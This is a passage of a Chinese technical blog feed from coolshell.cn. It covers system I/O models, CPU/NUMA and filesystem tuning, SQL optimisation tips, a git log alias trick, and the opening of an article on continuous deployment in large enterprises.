<p>前面说到过select/poll/epoll这三个系统调用，我们都知道，Unix/Linux下把所有的设备都当成文件来进行I/O，所以，那三个操作更应该算是I/O相关的系统调用。说到  I/O模型，这对于我们的I/O性能相当重要，我们知道，Unix/Linux经典的I/O方式是（关于Linux下的I/O模型，大家可以读一下这篇文章《<a href="https://www.ibm.com/developerworks/cn/linux/l-async/" target="_blank">使用异步I/O大大提高性能</a>》）：</p>
<p>第一种，同步阻塞式I/O，这个不说了。</p>
<p>第二种，同步无阻塞方式。其通过fctnl设置 O_NONBLOCK 来完成。</p>
<p>第三种，对于select/poll/epoll这三个是I/O不阻塞，但是在事件上阻塞，算是：I/O异步，事件同步的调用。</p>
<p>第四种，AIO方式。这种I/O 模型是一种处理与 I/O 并行的模型。I/O请求会立即返回，说明请求已经成功发起了。在后台完成I/O操作时，向应用程序发起通知，通知有两种方式：一种是产生一个信号，另一种是执行一个基于线程的回调函数来完成这次 I/O 处理过程。</p>
<p>第四种因为没有任何的阻塞，无论是I/O上，还是事件通知上，所以，其可以让你充分地利用CPU，比起第二种同步无阻塞好处就是，第二种要你一遍一遍地去轮询。Nginx之所所以高效，是其使用了epoll和AIO的方式来进行I/O的。</p>
<p>再说一下Windows下的I/O模型，</p>
<p>a）一个是WriteFile系统调用，这个系统调用可以是同步阻塞的，也可以是同步无阻塞的，关于看文件是不是以Overlapped打开的。关于同步无阻塞，需要设置其最后一个参数Overlapped，微软叫Overlapped I/O，你需要WaitForSingleObject才能知道有没有写完成。这个系统调用的性能可想而知。</p>
<p>b）另一个叫WriteFileEx的系统调用，其可以实现异步I/O，并可以让你传入一个callback函数，等I/O结束后回调之， 但是这个回调的过程Windows是把callback函数放到了APC（<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx" target="_blank">Asynchronous Procedure Calls</a>）的队列中，然后，只用当应用程序当前线程成为可被通知状态（Alterable）时，才会被回调。只有当你的线程使用了这几个函数时<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms687036(v=vs.85).aspx">WaitForSingleObjectEx</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms687028(v=vs.85).aspx">WaitForMultipleObjectsEx</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684245(v=vs.85).aspx">MsgWaitForMultipleObjectsEx</a>, <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms686293(v=vs.85).aspx">SignalObjectAndWait</a> 和 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms686307(v=vs.85).aspx">SleepEx</a>，线程才会成为Alterable状态。可见，这个模型，还是有wait，所以性能也不高。</p>
<p>c）然后是IOCP – IO Completion Port，IOCP会把I/O的结果放在一个队列中，但是，侦听这个队列的不是主线程，而是专门来干这个事的一个或多个线程去干（老的平台要你自己创建线程，新的平台是你可以创建一个线程池）。IOCP是一个线程池模型。这个和Linux下的AIO模型比较相似，但是实现方式和使用方式完全不一样。</p>
<p>当然，真正提高I/O性能方式是把和外设的I/O的次数降到最低，最好没有，所以，对于读来说，内存cache通常可以从质上提升性能，因为内存比外设快太多了。对于写来说，cache住要写的数据，少写几次，但是cache带来的问题就是实时性的问题，也就是latency会变大，我们需要在写的次数上和相应上做权衡。</p>
<p><strong>B）多核<strong>CPU</strong>调优</strong></p>
<p>关于CPU的多核技术，我们知道，CPU0是很关键的，如果0号CPU被用得过狠的话，别的CPU性能也会下降，因为CPU0是有调整功能的，所以，我们不能任由操作系统负载均衡，因为我们自己更了解自己的程序，所以，我们可以手动地为其分配CPU核，而不会过多地占用CPU0，或是让我们关键进程和一堆别的进程挤在一起。</p>
<ul>
<li>对于Windows来说，我们可以通过“任务管理器”中的“进程”而中右键菜单中的“设置相关性……”（Set Affinity…）来设置并限制这个进程能被运行在哪些核上。</li>
</ul>
<ul>
<li>对于Linux来说，可以使用taskset命令来设置（你可以通过安装schedutils来安装这个命令：apt-get install schedutils）</li>
</ul>
<p>多核CPU还有一个技术叫<a href="https://en.wikipedia.org/wiki/Non-Uniform_Memory_Access" target="_blank">NUMA</a>技术（Non-Uniform Memory Access）。传统的多核运算是使用SMP(Symmetric Multi-Processor )模式，多个处理器共享一个集中的存储器和I/O总线。于是就会出现一致存储器访问的问题，一致性通常意味着性能问题。NUMA模式下，处理器被划分成多个node， 每个node有自己的本地存储器空间。关于NUMA的一些技术细节，你可以查看一下这篇文章《<a href="https://www.ibm.com/developerworks/cn/linux/l-numa/index.html" target="_blank">Linux 的 NUMA 技术</a>》，在Linux下，对NUMA调优的命令是：<strong>numactl </strong>。如下面的命令：（指定命令“myprogram arg1 arg2”运行在node 0 上，其内存分配在node 0 和 1上）</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">numactl --cpubind=0 --membind=0,1 myprogram arg1 arg2</code></p>
<p>当然，上面这个命令并不好，因为内存跨越了两个node，这非常不好。最好的方式是只让程序访问和自己运行一样的node，如：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">$ numactl --membind 1 --cpunodebind 1 --localalloc myapplication</code></p>
<p><strong>C）文件系统调优</strong></p>
<p>关于文件系统，因为文件系统也是有cache的，所以，为了让文件系统有最大的性能。首要的事情就是分配足够大的内存，这个非常关键，在Linux下可以使用free命令来查看 free/used/buffers/cached，理想来说，buffers和cached应该有40%左右。然后是一个快速的硬盘控制器，SCSI会好很多。最快的是Intel SSD 固态硬盘，速度超快，但是写次数有限。</p>
<p>接下来，我们就可以调优文件系统配置了，对于Linux的Ext3/4来说，几乎在所有情况下都有所帮助的一个参数是关闭文件系统访问时间，在/etc/fstab下看看你的文件系统 有没有noatime参数（一般来说应该有），还有一个是dealloc，它可以让系统在最后时刻决定写入文件发生时使用哪个块，可优化这个写入程序。还要注间一下三种日志模式：data=journal、data=ordered和data=writeback。默认设置data=ordered提供性能和防护之间的最佳平衡。</p>
<p>当然，对于这些来说，ext4的默认设置基本上是最佳优化了。</p>
<p>这里介绍一个Linux下的查看I/O的命令—— iotop，可以让你看到各进程的磁盘读写的负载情况。</p>
<p>其它还有一些关于NFS、XFS的调优，大家可以上google搜索一些相关优化的文章看看。关于各文件系统，大家可以看一下这篇文章——《<a href="https://www.ibm.com/developerworks/cn/linux/l-jfs/" target="_blank">Linux日志文件系统及性能分析</a>》</p>
<p><strong>4.5）数据库调优</strong></p>
<p>数据库调优并不是我的强项，我就仅用我非常有限的知识说上一些吧。注意，下面的这些东西并不一定正确，因为在不同的业务场景，不同的数据库设计下可能会得到完全相反的结论，所以，我仅在这里做一些一般性的说明，具体问题还要具体分析。</p>
<p><strong>A）数据库引擎调优</strong></p>
<p>我对数据库引擎不是熟，但是有几个事情我觉得是一定要去了解的。</p>
<ul>
<li>
<strong>数据库的锁的方式</strong>。这个非常非常地重要。并发情况下，锁是非常非常影响性能的。各种隔离级别，行锁，表锁，页锁，读写锁，事务锁，以及各种写优先还是读优先机制。性能最高的是不要锁，所以，分库分表，冗余数据，减少一致性事务处理，可以有效地提高性能。NoSQL就是牺牲了一致性和事务处理，并冗余数据，从而达到了分布式和高性能。</li>
<li>
<strong>数据库的存储机制</strong>。不但要搞清楚各种类型字段是怎么存储的，更重要的是数据库的数据存储方式，是怎么分区的，是怎么管理的，比如Oracle的数据文件，表空间，段，等等。了解清楚这个机制可以减轻很多的I/O负载。比如：MySQL下使用<span style="font-size: xx-small;">show engines;</span>可以看到各种存储引擎的支持。不同的存储引擎有不同的侧重点，针对不同的业务或数据库设计会让你有不同的性能。</li>
<li>
<strong>数据库的分布式策略</strong>。最简单的就是复制或镜像，需要了解分布式的一致性算法，或是主主同步，主从同步。通过了解这种技术的机理可以做到数据库级别的水平扩展。</li>
</ul>
<p><strong>B）SQL语句优化</strong></p>
<p>关于SQL语句的优化，首先也是要使用工具，比如：<a href="https://www.mysql.com/products/enterprise/query.html" target="_blank">MySQL SQL Query Analyzer</a>，<a href="https://www.oracle-base.com/articles/11g/sql-performance-analyzer-11gr1.php" target="_blank">Oracle SQL Performance Analyzer</a>，或是微软<a href="https://msdn.microsoft.com/en-us/library/aa216945(v=sql.80).aspx" target="_blank">SQL Query Analyzer</a>，基本上来说，所有的RMDB都会有这样的工具，来让你查看你的应用中的SQL的性能问题。 还可以使用explain来看看SQL语句最终Execution Plan会是什么样的。</p>
<p>还有一点很重要，数据库的各种操作需要大量的内存，所以服务器的内存要够，优其应对那些多表查询的SQL语句，那是相当的耗内存。</p>
<p>下面我根据我有限的数据库SQL的知识说几个会有性能问题的SQL：</p>
<ul>
<li>
<strong>全表检索</strong>。比如：select * from user where lastname = “xxxx”，这样的SQL语句基本上是全表查找，线性复杂度O(n)，记录数越多，性能也越差（如：100条记录的查找要50ms，一百万条记录需要5分钟）。对于这种情况，我们可以有两种方法提高性能：一种方法是分表，把记录数降下来，另一种方法是建索引（为lastname建索引）。索引就像是key-value的数据结构一样，key就是where后面的字段，value就是物理行号，对索引的搜索复杂度是基本上是O(log(n)) ——用B-Tree实现索引（如：100条记录的查找要50ms，一百万条记录需要100ms）。</li>
</ul>
<ul>
<li>
<strong>索引</strong>。对于索引字段，最好不要在字段上做计算、类型转换、函数、空值判断、字段连接操作，这些操作都会破坏索引原本的性能。当然，索引一般都出现在Where或是Order by字句中，所以对Where和Order by子句中的子段最好不要进行计算操作，或是加上什么NOT之类的，或是使用什么函数。</li>
</ul>
<ul>
<li>
<strong>多表查询</strong>。关系型数据库最多的操作就是多表查询，多表查询主要有三个关键字，EXISTS，IN和JOIN（关于各种join，可以参看<a title="图解SQL的Join" href="https://coolshell.cn/articles/3463.html" target="_blank">图解SQL的Join</a>一文）。基本来说，现代的数据引擎对SQL语句优化得都挺好的，JOIN和IN/EXISTS在结果上有些不同，但性能基本上都差不多。有人说，EXISTS的性能要好于IN，IN的性能要好于JOIN，我各人觉得，这个还要看你的数据、schema和SQL语句的复杂度，对于一般的简单的情况来说，都差不多，所以千万不要使用过多的嵌套，千万不要让你的SQL太复杂，宁可使用几个简单的SQL也不要使用一个巨大无比的嵌套N级的SQL。还有人说，如果两个表的数据量差不多，Exists的性能可能会高于In，In可能会高于Join，如果这两个表一大一小，那么子查询中，Exists用大表，In则用小表。这个，我没有验证过，放在这里让大家讨论吧。另，有一篇关于SQL Server的文章大家可以看看《<a href="http://explainextended.com/2009/06/16/in-vs-join-vs-exists/" target="_blank">IN vs JOIN vs EXISTS</a>》</li>
</ul>
<ul>
<li>
<strong>JOIN操作</strong>。有人说，Join表的顺序会影响性能，只要Join的结果集是一样，性能和join的次序无关。因为后台的数据库引擎会帮我们优化的。Join有三种实现算法，嵌套循环，排序归并，和Hash式的Join。（MySQL只支持第一种）</li>
</ul>
<ul style="padding-left: 60px;">
<ul>
<li>嵌套循环，就好像是我们常见的多重嵌套循环。注意，前面的索引说过，数据库的索引查找算法用的是B-Tree，这是O(log(n))的算法，所以，整个算法复法度应该是O(log(n)) * O(log(m)) 这样的。</li>
<li>Hash式的Join，主要解决嵌套循环的O(log(n))的复杂，使用一个临时的hash表来标记。</li>
<li>排序归并，意思是两个表按照查询字段排好序，然后再合并。当然，索引字段一般是排好序的。</li>
</ul>
</ul>
<p style="padding-left: 60px;">还是那句话，具体要看什么样的数据，什么样的SQL语句，你才知道用哪种方法是最好的。</p>
<ul>
<li>
<strong>部分结果集。</strong>我们知道MySQL里的Limit关键字，Oracle里的rownum，SQL Server里的Top都是在限制前几条的返回结果。这给了我们数据库引擎很多可以调优的空间。一般来说，返回top n的记录数据需要我们使用order by，注意在这里我们需要为order by的字段建立索引。有了被建索引的order by后，会让我们的select语句的性能不会被记录数的所影响。使用这个技术，一般来说我们前台会以分页方式来显现数据，Mysql用的是OFFSET，SQL Server用的是FETCH NEXT，这种Fetch的方式其实并不好是线性复杂度，所以，如果我们能够知道order by字段的第二页的起始值，我们就可以在where语句里直接使用&gt;=的表达式来select，这种技术叫seek，而不是fetch，seek的性能比fetch要高很多。</li>
</ul>
<ul>
<li>
<strong>字符串</strong>。正如我前面所说的，字符串操作对性能上有非常大的恶梦，所以，能用数据的情况就用数字，比如：时间，工号，等。</li>
</ul>
<ul>
<li>
<strong>全文检索</strong>。千万不要用Like之类的东西来做全文检索，如果要玩全文检索，可以尝试使用<a href="http://sphinxsearch.com/" target="_blank">Sphinx</a>。</li>
</ul>
<ul>
<li>
<strong>其它</strong>。
<ul>
<li>不要select *，而是明确指出各个字段，如果有多个表，一定要在字段名前加上表名，不要让引擎去算。</li>
<li>不要用Having，因为其要遍历所有的记录。性能差得不能再差。</li>
<li>尽可能地使用UNION ALL  取代  UNION。</li>
<li>索引过多，insert和delete就会越慢。而update如果update多数索引，也会慢，但是如果只update一个，则只会影响一个索引表。</li>
<li>等等。</li>
</ul>
</li>
</ul>
<p>关于SQL语句的优化，网上有很多文章， 不同的数据库引擎有不同的优化技巧，正如本站以前转发的《<a href="https://coolshell.cn/articles/1846.html" rel="bookmark">MySQL性能优化的最佳20+条经验</a>》</p>
<p>先写这么多吧，欢迎大家指正补充。</p>
<blockquote><p><strong>注：</strong>这篇文章的确是个大杂烩。其实其中的说到的很多技术在网上都有很多很多的技术文章，google一下就能找到一堆有很多细节的文章，所以我也就不写了。这篇性能调优的文章写作的动机是之前看到 <a href="https://weibo.com/n/%E6%B7%98%E5%AE%9D%E8%A4%9A%E9%9C%B8">@淘宝褚霸</a> 强推的<a href="http://highscalability.com/">highscalability.com</a>上的这篇文章：<a href="http://highscalability.com/blog/2012/5/16/big-list-of-20-common-bottlenecks.html" target="_blank">Big List Of 20 Common Bottlenecks</a>，觉得这篇文章泛泛而谈，觉得自己能写得比它好，所以就产生了动机。</p></blockquote>
<p>（<span style="color: #cc0000;"><strong>转载时请注明作者和出处，请勿用于商业用途</strong></span>）</p>
 ]]></content>
<pubDate>2012-06-20T09:24:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/7490.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Git显示漂亮日志的小技巧 ]]></title>
<link>https://coolshell.cn/articles/7755.html</link>
<content><![CDATA[ 
<p>原文：<a href="https://garmoncheg.blogspot.com/2012/06/pretty-git-log.html" target="_blank">http://garmoncheg.blogspot.com/2012/06/pretty-git-log.html</a> （墙）</p>
<p>Git的传统log如下所示，你喜欢吗？</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">看看下面这个你喜不喜欢？（点击图片看大图）</p>
<p style="text-align: left;"><span id="more-7755"></span></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2012/06/git.log_.02.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">要做到这样，命令行如下：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --</code></p>
<p>这样有点长了，我们可以这样：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --"</code></p>
<p>然后，我们就可以使用这样的短命令了：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">git lg</code></p>
<p>如果你想看看git log –pretty=format的参数，你可以看看<a href="https://git-scm.com/book/zh/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2" target="_blank">这篇文章</a>。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-06-24T23:29:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/7755.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 持续部署，并不简单！ ]]></title>
<link>https://coolshell.cn/articles/7657.html</link>
<content><![CDATA[ 
<p style="text-align: left;">【<strong>感谢 <a href="https://weibo.com/renfake" target="_blank">@常新居士</a> 投递此文</strong> 】</p>
<p style="text-align: left;">这几年，持续集成随着敏捷在国内的推广而持续走热，与之相伴的持续部署也一直备受关注。<strong>自前两年，持续交付这个延续性概念又闯进了国内IT圈，慢慢开始在社区和会议中展露头角。许多不明真相的群众跟风哭着喊着要“上”，而许多前CI的半吊子玩家换件衣服就接着干，有的甚至衣服都来不及换……</strong>。国内的这些土财主如果不巧请了某些所谓的战略家，除了建了一堆持续集成环境，以及每天嚷嚷着要这个要那个，混乱的状况在根本上没有得到改善。本文无意费力探讨持续集成和持续交付的概念，而是打算谈谈对于大型软件企业，以持续集成为基础实现持续部署（交付）时，所要面对的问题以及可行的解决方案。地主老财们，夜黑风正猛，山高路又远，注意脚下……</p>
<p style="text-align: right;"><strong>And God Said, Let there be light: and there wa</strong>— GENSIS, Charpter 1, King James</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81%E8%B5%B7%E6%AD%A5" title="一、起步">一、起步</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#11%EF%BC%89%E7%BC%96%E8%AF%91%E6%97%B6%E4%BE%9D%E8%B5%96%E5%92%8C%E8%BF%90%E8%A1%8C%E6%97%B6%E4%BE%9D%E8%B5%96" title="1.1）编译时依赖和运行时依赖">1.1）编译时依赖和运行时依赖</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#12%EF%BC%89%E4%BE%9D%E8%B5%96%E6%97%B6%E7%9A%84%E5%A4%8D%E6%9D%82%E5%BA%A6" title="1.2）依赖时的复杂度">1.2）依赖时的复杂度</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#13%EF%BC%89%E4%BB%BB%E5%8A%A1%E5%88%86%E5%B7%A5" title="1.3）任务分工">1.3）任务分工</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#14%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2" title="1.4）自动化部署">1.4）自动化部署</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%BA%8C%E3%80%81%E5%9B%B0%E5%A2%83" title="二、困境">二、困境</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%B8%89%E3%80%81%E4%BB%BB%E8%84%89-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86" title="三、任脉——环境管理">三、任脉——环境管理</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%9B%9B%E3%80%81%E7%9D%A3%E8%84%89-%E9%83%A8%E7%BD%B2%E7%B3%BB%E7%BB%9F" title="四、督脉——部署系统">四、督脉——部署系统</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E4%BA%94%E3%80%81%E6%B2%A1%E5%AE%8C" title="五、没完">五、没完</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93" title="六、总结">六、总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E8%B5%B7%E6%AD%A5"></span>一、起步<span class="ez-toc-section-end"></span>
</h4>
<p>先来讲个故事……</p>
<p>几年前，一对留美的夫妇通过朋友找到我，让我帮忙在国内组建一个开发团队，该团队负责为其开发一款基于社交网络的客户关系管理软件,（暂且称之为项目A）。这个项目除了尚不清晰的需求范围和很紧的期限外，作为业内人士的老公Richard根据眼下流行的软件开发过程还提了诸多额外的要求：</p>
<ul>
<li>
<strong>功能要及早交付</strong>（以便拿去和潜在的投资人洽谈）</li>
<li>
<strong>功能在部署到生产环境前要先部署的一个测试环境</strong>（Richard要试用后给予反馈）</li>
<li>
<strong>功能必须经过测试</strong>（长期作为软件外包的甲方，对质量要求严格）</li>
<li>
<strong>要减少后期维护的工作</strong>（美国人精贵，少雇一个是一个）</li>
<li>
<strong>支持协同开发</strong>（以便维护人员及早介入）</li>
<li>……</li>
</ul>
<p><span style="color: #000000;"><strong>这正是持续集成所要解决的典型场景</strong></span>。针对Richard的要求，我们只要建立一个基于Hudson（现在叫Jenkins）+Maven +SVN 的持续集成环境（再加上持续集成所要求的测试和过程）就可以很好地满足上述要要求，此方案的结构如下：</p>
<p><span id="more-7657"></span></p>
<p><a href="https://coolshell.cn/?attachment_id=7686" rel="attachment wp-att-7686"><img alt="image placeholder" ></a></p>
<p>对于上述方案，让我们近距离看看各个服务器的内部情况，以及人员在这种方案下的分工协作：</p>
<p><a href="https://coolshell.cn/?attachment_id=7708" rel="attachment wp-att-7708"><img alt="image placeholder" ></a></p>
<p>我们先谈谈上面的图中涉及的一些概念性问题：</p>
<h5>
<span class="ez-toc-section" id="11%EF%BC%89%E7%BC%96%E8%AF%91%E6%97%B6%E4%BE%9D%E8%B5%96%E5%92%8C%E8%BF%90%E8%A1%8C%E6%97%B6%E4%BE%9D%E8%B5%96"></span><strong>1.1）编译时依赖</strong>和<strong>运行时依赖</strong><span class="ez-toc-section-end"></span>
</h5>
<p>从字面上不难理解这两种依赖的类型。但要注意虽然编译时依赖常常也是运行时依赖，但并不能推断出一方必然是另一方。比如，在开发的过程中需要某些提供API的Jar包，而运行时可能是具体API实现的Jar包。再者，被依赖的包会有其自身的依赖，因此,项目对这些包产生间接依赖（<strong>运行时依赖</strong>），依此类推，最终形成一个<strong>依赖树</strong>。当项目运行时，这些依赖树上的包必须全部就位。</p>
<p>Maven在POM中通scope来界定依赖的类型，从而帮助开发和运维人员摆脱手动处理依赖树的工作，然而运行时所依赖包最终是要安装到生产环境的，这部分工作Maven并不能自动完成。因此，一个常用方式是将运行时所依赖的包拷贝到项目文件中，比如Java Web应用的WEB-INF/lib，然后将项目总的打一个包。<strong>在安装项目包后，修改环境变量，将这些包所在的路径加入相应的环境变量中，如ClassPath</strong>。</p>
<p>再看个例子，现代的操作系统和其它系统框架都考虑到了运行时依赖树的处理问题，比如Ubuntu的apt-get，CentOS的yum，Ruby的RubyGem，Node的npm等等。</p>
<h5>
<span class="ez-toc-section" id="12%EF%BC%89%E4%BE%9D%E8%B5%96%E6%97%B6%E7%9A%84%E5%A4%8D%E6%9D%82%E5%BA%A6"></span>1.2）依赖时的复杂度<span class="ez-toc-section-end"></span>
</h5>
<p>项目除了对程序包的依赖，对于运行环境也有些具体的要求，比如，Web应用需要安装和配置Web服务器，应用服务器，数据服务器等，企业应用中可能需要消息队列，缓存，定时作业，或是对其它系统以Web Service方式暴露的服务。这些可以看做项目在系统层面对外部的依赖。这些依赖有些可以由项目自行处理，而有些则是项目无法处理的，比如运行容器，操作系统等，这些是项目的运行环境。</p>
<p>总之，依赖的复杂度主要有两个：</p>
<ol>
<li>依赖包间的版本兼容性问题。兼容性问题是软件开发的恶梦</li>
<li>间接依赖，或多重依赖问题。这个问题可以类比想像一下C++中的多重继续种出现的很多问题。</li>
</ol>
<div>比如：Ａ依赖于python 2.7，A还依赖于B，但是B却依赖于python 3，而Python 2.7和Python 3不兼容。这是依赖中最恶心的事。</div>
<h5>
<span class="ez-toc-section" id="13%EF%BC%89%E4%BB%BB%E5%8A%A1%E5%88%86%E5%B7%A5"></span>1.3）任务分工<span class="ez-toc-section-end"></span>
</h5>
<p>由于项目简单，因此并不需要专门的运维人员。以一个100人左右以交付为主业（恩，就是做外包）的公司为例，由于没有任何历史项目和代码的拖累，且各个项目间也没有任何关联，故而只需要配备一个IT支持人员进行资源方面的管理：分配机器，报修，初始化系统，分配IP地址等。各个项目的运行环境、数据库、开发环境等都由具体项目的开发人员手动完成。 环境出问题怎么办？很简单，凉拌——重装系统。实际的运行效果不错。</p>
<h5>
<span class="ez-toc-section" id="14%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2"></span>1.4）自动化部署<span class="ez-toc-section-end"></span>
</h5>
<p>由于Hudson这样的持续集成环境提供了自动编译（定时或触发式）的功能，而且可以在编译过程中提供了一些扩展点，因此通过提供一个部署用的脚本，就可以非常容易实现简单的自动化部署。</p>
<p>毫无疑问，持续集成就是敏捷的魔法药，它见效快、副作用小、业界的争论少。每每运用在混乱的项目中时，几周内项目就开始持续的产出经过测试的功能。对于独立项目，以持续集成为中心的持续部署绝对是不二选择。</p>
<p><strong>但是，我们有没有想过，这会是一个自动化部署的通用解决方案吗？持续集成应该位于持续交付的中心吗？</strong></p>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E5%9B%B0%E5%A2%83"></span>二、困境<span class="ez-toc-section-end"></span>
</h4>
<p>回到我们的故事：项目A上线两年后，运营业绩不错，投资人第一轮注资后，Richard的公司进行了扩张，他们对项目进行了重构，而且随着用户数量的增长，公司分别在美国、英国和日本等地建立了运营中心，并且对亚洲市场进行的定制功能开发（项目A+），接下来，公司又投入开发了团购系统（项目B）。在获得了新一轮投资后，各条本来比较简单的业务和功能线上越来越复杂，需要不断地细分，于是公司再度扩张（开发人员达到了300人，国内200多人，而运维团队主要在美国），随后又为项目A/A+的高级用户开发了问答系统（项目C）。目前，他们正准备开发手机系统。 看看下面的图，公司增长的过程中，整个项目环境也变得复杂。（注意，这里是一种逻辑结构，而在物理层面项目B和项目A的生产环境可能部署在相同的机器上）。</p>
<p><a href="https://coolshell.cn/?attachment_id=7694" rel="attachment wp-att-7694"><img alt="image placeholder" ></a></p>
<p>同时，原本单一的项目软件结构随着业务系统的增加也不再简单： <img alt="image placeholder" ></p>
<p>而软件间的版本依赖使这个问题变得更为复杂：</p>
<p><a href="https://coolshell.cn/?attachment_id=7700" rel="attachment wp-att-7700"><img alt="image placeholder" ></a></p>
<p>现在，Richard的公司已经不再是一条快乐的小鱼，而是渐渐成为一直庞大的巨兽。虽然只有四个产品，但公司却要支持几百台开发机，几十台生产服务器，还有对应的测试环境，数据库服务器，以及几十个开发小组，和一大堆的内部项目。我们尽可以使用持续集成来为我们完成自动化部署。但，<strong>当我们为各个项目建立起持续集成环境后，它能满足我们对于持续部署的要求吗？我们前期的工作可以简化我们今后项目的持续交付的工作的难度吗？它需要我们为之建立一个庞大的运维团队，还是可以让我们能节省下每一毛钱来投入到真正的业务价值中去？</strong></p>
<p><strong>让我们先来看看复杂的项目环境中的几个场景</strong>：</p>
<p><strong>场景1：环境升级</strong></p>
<p style="padding-left: 30px;">项目A和项目B都依赖于Web容器，公司决定升级Web容器版本，而公司要升级的机器有上百台，依赖人肉升级已不现实，维护团队因此针对各种软件开发了相应的自动化脚本，但当新的软件出现时，必须要开发新的脚本。而且当同时升级若干环境软件时，则难度随之增大，手工调度的方式极易出错，当升级失败时仍需要大量人工处理。由于存在大量升级脚本，有一定的维护成本。</p>
<p><strong>场景2：依赖于环境的软件升级与回滚</strong></p>
<p style="padding-left: 30px;">针对环境升级，公司为项目A和项目B开发了新的版本。但环境的升级和软件的升级不是同步进行，出错的可能性非常大（想一想间接依赖和多重依赖的情况）。当新版本部署到生产系统时，发现问题，需要回滚到之前的版本——所有运行时版本都需要回滚，而且环境也需要同步回滚。几百台机器……</p>
<p><strong>场景3：运行时依赖</strong></p>
<p style="padding-left: 30px;">在第一节的方案中，我们将所有的运行时依赖都打包到一起。当项目依赖关系复杂时，这样产生的包将非常臃肿，潜在地延长了部署的时间（想一想全世有几百台服务器，一个部署计划需要部署几百兆文件的情况），而且产生冲突的可能性非常大，而且对于不同类型的项目（Java和Ruby项目）缺乏通用性。06年左右，Nortel可是拿Excel统计过运行时依赖的，牵涉若干项目组，反复多次，没有个把月真搞不定。</p>
<p><strong>场景4：泛滥的部署</strong></p>
<p style="padding-left: 30px;">每个项目相关的持续集成环境都需要开发自己的部署脚本，重复投入大，而且各个项目的部署过程不一致，并且对于同一个项目无法同时满足不同目的部署要求，例如，环境或系统配置参数改变后，无需安装包，只需做清理和激活的工作。最后，持续集成只是支持了和代码修改有关的部署。</p>
<p><strong>场景5：不一致的环境</strong></p>
<p style="padding-left: 30px;">简单项目中，开发环境和运行环境都由开发人员搭建，当公司变大时，系统的运行环境将由运维人员搭建，而开发环境如果由运维人员搭建则工作量太大，由开发人员自己搭建则操作复杂又容易产生不一致的情况。</p>
<p><strong>场景6：热切换</strong></p>
<p style="padding-left: 30px;">对于某些部署，需要尽量减少服务的停止时间，需要在服务的同时进行部署。</p>
<p>这些场景只是以持续集成为中心的持续部署在面对大型企业时所遇到的部分问题。大型企业，人多，项目多，机器多，项目环境复杂，部署维护工作繁多。以持续集成为基础的部署可以解决各个项目的集成问题，却无法帮助企业应对复杂的项目环境和各种不同的部署要求。<strong>究其更本，大型企业中的部署不再是一个简单的问题，而是一个交付生态圈，基础设施和环境管理必须要纳入考虑之中。</strong>要实现真正意义上的持续部署，我们就必须<strong>把环境和项目同等对待</strong>，通通纳入管理之中。同时，部署本身要得到统一。<strong>一个好的部署机制，应该是易于建立，易于使用，易于维护。</strong></p>
<h4>
